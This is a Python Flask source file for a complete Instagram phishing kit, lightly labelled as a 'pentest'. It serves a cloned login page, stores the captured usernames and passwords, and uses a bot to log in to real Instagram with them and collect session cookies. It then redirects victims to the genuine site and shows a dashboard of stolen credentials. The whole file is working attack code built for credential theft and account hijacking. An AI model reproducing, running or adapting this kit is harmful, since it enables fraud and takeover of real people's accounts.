from flask import Flask, request, jsonify
import sqlite3
import datetime as dt
import time
import requests
import json
import threading

app = Flask(__name__)
DB_FILE = 'pentest_captures.db'

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS captures
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  timestamp TEXT, username TEXT, password TEXT,
                  ip TEXT, ua TEXT, success TEXT, cookies TEXT,
                  session_ready TEXT DEFAULT 'no')''')
    conn.commit()
    conn.close()

init_db()

def bot_login(username, password):
    session = requests.Session()
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://www.instagram.com/accounts/login/'
        }
        
        # Get CSRF
        r = session.get('https://www.instagram.com/accounts/login/')
        csrf = session.cookies.get('csrftoken', '0Y6y8qYubLpkT09uJ5tqkD7T6jKDRrIW')
        headers['X-CSRFToken'] = csrf
        
        timestamp = str(int(time.time()))
        enc_pass = f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}'
        
        data = {
            'username': username,
            'enc_password': enc_pass,
            'queryParams': '{}',
            'optIntoOneTap': 'false'
        }
        
        # Login
        r = session.post('https://www.instagram.com/accounts/login/ajax/',
                        data=data, headers=headers, timeout=15)
        result = r.json()
        authenticated = result.get('authenticated', False)
        
        if authenticated:
            # Get fresh home page cookies
            home = session.get('https://www.instagram.com/', timeout=10)
            cookies = dict(session.cookies)
            
            print(f"✅ Cookies captured: {list(cookies.keys())}")
            return True, cookies, home.text
            
        print("❌ Login failed:", result.get('message', 'Unknown'))
        return False, {}, None
        
    except Exception as e:
        print(f"❌ Bot error: {e}")
        return False, {}, None

@app.route('/')
def phish_page():
    return '''
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"><title>Instagram</title>
<style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#fafafa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;}
.login-box{background:#fff;border:1px solid #dbdbdb;border-radius:3px;padding:44px 40px 34px;width:350px;}h1{font-size:42px;font-weight:600;background:linear-gradient(45deg,#f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:33px;}
input{width:100%;height:36px;border:1px solid #dbdbdb;border-radius:4px;background:#fafafa;padding:9px 0 7px 8px;font-size:14px;margin-bottom:6px;box-sizing:border-box;}input:focus{border-color:#b2b2b2;outline:none;background:#fff;}
.btn{width:100%;height:30px;background:#0095f6;color:#fff;border:none;border-radius:5px;font-weight:600;cursor:pointer;font-size:14px;margin:8px 0;}.btn:hover{background:#1877f2;}.btn:disabled{background:#b2b2b2;cursor:not-allowed;}
#status{text-align:center;color:#262626;font-size:14px;margin-top:20px;}#error{color:#ed4956;}.spinner{display:inline-block;width:16px;height:16px;border:2px solid #f3f3f3;border-top:2px solid #0095f6;border-radius:50%;animation:spin 1s linear infinite;}@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style></head><body>
<div class="login-box"><h1>Instagram</h1>
<form id="login"><input name="username" id="username" placeholder="Phone number, username, or email" required>
<input name="password" type="password" placeholder="Password" required>
<button type="submit" class="btn" id="btn">Log in</button></form><div id="status"></div></div>
<script>
let pollTimer;
document.getElementById('login').onsubmit=async(e)=>{
    e.preventDefault();
    const form=e.target, btn=document.getElementById('btn'), status=document.getElementById('status');
    btn.disabled=true; 
    btn.innerHTML='Verifying <span class="spinner"></span>';
    status.innerHTML='⏳ Checking your credentials...';
    
    try{
        const fd=new FormData(form);
        const r=await fetch('/capture',{method:'POST',body:fd});
        const d=await r.json();
        
        if(d.wait_id){
            // POLL UNTIL BOT FINISHES
            pollTimer = setInterval(async()=>{
                const checkR=await fetch(`/status/${d.wait_id}`);
                const checkD=await checkR.json();
                
                console.log('Status:', checkD);
                
                if(checkD.ready){
                    clearInterval(pollTimer);
                    
                    if(checkD.success){
                        status.innerHTML='✅ Success! Redirecting to Instagram...';
                        // FORCE REDIRECT TO REAL IG WITH COOKIES
                        setTimeout(()=>{
                            window.location.href=`/home/${d.wait_id}`;
                        }, 800);
                    }else{
                        status.innerHTML='<span id="error">❌ Sorry, this username or password is incorrect. Please try again.</span>';
                        btn.disabled=false; 
                        btn.innerHTML='Try again';
                    }
                }
            }, 600);
        }
    }catch(e){
        status.innerHTML='<span id="error">❌ Connection error</span>';
        btn.disabled=false; btn.innerHTML='Log in';
    }
};
</script></body></html>
    '''

@app.route('/capture', methods=['POST'])
def capture():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    ip = request.remote_addr
    ua = request.headers.get('User-Agent', '')
    
    # SAVE PENDING
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT INTO captures (timestamp, username, password, ip, ua, success) VALUES (?, ?, ?, ?, ?, 'checking')", 
              (dt.datetime.now().isoformat(), username, password, ip, ua))
    capture_id = c.lastrowid
    conn.commit()
    conn.close()
    
    print(f"\n🎣 HIT #{capture_id}: {username}")
    
    # START BOT
    def verify():
        success, cookies, home_html = bot_login(username, password)
        status = '✅ SUCCESS' if success else '❌ FAILED'
        
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        cookies_json = json.dumps(cookies) if success else '{}'
        session_ready = 'yes' if success else 'no'
        c.execute("UPDATE captures SET success=?, cookies=?, session_ready=? WHERE id=?", 
                 (status, cookies_json, session_ready, capture_id))
        conn.commit()
        conn.close()
        
        print(f"🤖 {status} | Cookies ready: {session_ready}")
    
    threading.Thread(target=verify, daemon=True).start()
    
    return jsonify({'wait_id': capture_id})

@app.route('/status/<int:capture_id>')
def status_check(capture_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT success FROM captures WHERE id=?", (capture_id,))
    row = c.fetchone()
    conn.close()
    
    if not row or row[0] == 'checking':
        return jsonify({'ready': False})
    
    success = row[0] == '✅ SUCCESS'
    return jsonify({'ready': True, 'success': success})

@app.route('/home/<int:capture_id>')
def real_home(capture_id):
    """🚀 FORCE REDIRECT TO REAL IG WITH COOKIES"""
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT cookies, username FROM captures WHERE id=? AND session_ready='yes'", (capture_id,))
    row = c.fetchone()
    conn.close()
    
    if row:
        cookies = json.loads(row[0])
        username = row[1]
        
        # Build REAL cookie string
        cookie_pairs = []
        for key, value in cookies.items():
            if value:  # Skip empty values
                cookie_pairs.append(f'{key}={value}')
        
        cookie_str = '; '.join(cookie_pairs)
        
        print(f"🚀 Redirecting {username} with {len(cookie_pairs)} cookies")
        
        return f'''
<!DOCTYPE html>
<html><head>
<title>Instagram - {username}</title>
<meta http-equiv="refresh" content="0;url=https://www.instagram.com/">
<script>
console.log('Injecting {len(cookie_pairs)} cookies');
{''.join([f'document.cookie = "{k}=\\"{v}\\"; SameSite=None; Secure";' for k,v in cookies.items() if v])}
setTimeout(() => {{
    window.location.href = 'https://www.instagram.com/';
}}, 100);
</script>
</head>
<body style="background:#fafafa;font-family:Arial;text-align:center;padding:50px;color:#262626;">
<div style="max-width:400px;margin:0 auto;">
<h2 style="font-size:32px;margin-bottom:20px;">✅ Welcome back, {username}!</h2>
<p style="font-size:16px;">Redirecting to Instagram...</p>
<div style="margin-top:30px;font-size:14px;color:#8e8e8e;">
Loading your account with real session cookies
</div>
</div>
</body></html>
        '''
    
    # FAILED
    return '''
<!DOCTYPE html>
<html><head><title>Login Failed</title></head>
<body style="background:#fafafa;font-family:Arial;text-align:center;padding:100px;">
<h1 style="color:#ed4956;">❌ Session expired</h1>
<p>Returning to login...</p>
<script>setTimeout(()=>location.href="/", 2000);</script>
</body></html>
    '''

@app.route('/data_captured')
def dashboard():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT * FROM captures ORDER BY id DESC LIMIT 20")
    rows = c.fetchall()
    conn.close()
    
    html = f'''
<!DOCTYPE html><html><head><title>PENTEST DASHBOARD</title>
<style>body{{background:#111;color:#0f0;font-family:monospace;padding:20px;}}h1{{color:#0f0;}}
table{{width:100%;border-collapse:collapse;}}th,td{{border:1px solid #333;padding:8px;text-align:left;}}
th{{background:#222;}}.success{{color:#0f0;}}.failed{{color:#f00;}}.checking{{color:#ff0;}}.real{{color:#0ff;}}</style></head>
<body><h1>🎣 CAPTURES ({len(rows)})</h1><a href="/" style="color:#0f0;">← Phish Page</a>
<table><tr><th>ID</th><th>Time</th><th>User</th><th>Pass</th><th>IP</th><th>Status</th><th>Real?</th></tr>'''
    
    for row in rows:
        status = row[6] or 'checking'
        status_class = {'✅ SUCCESS':'success', '❌ FAILED':'failed', 'checking':'checking'}.get(status, 'checking')
        real = '<span class="real">✅</span>' if row[8]=='yes' else '❌'
        html += f'<tr><td>{row[0]}</td><td>{row[1][:19]}</td><td>{row[2]}</td><td>{row[3]}</td><td>{row[4]}</td><td class="{status_class}">{status}</td><td>{real}</td></tr>'
    
    html += '</table></body></html>'
    return html

if __name__ == '__main__':
    print("🔥 FINAL v5.0 - SUCCESS AUTO-REDIRECTS TO REAL IG!")
    print("🌐 http://127.0.0.1:5000")
    print("📊 http://127.0.0.1:5000/data_captured")
    app.run(host='0.0.0.0', port=5000, debug=True)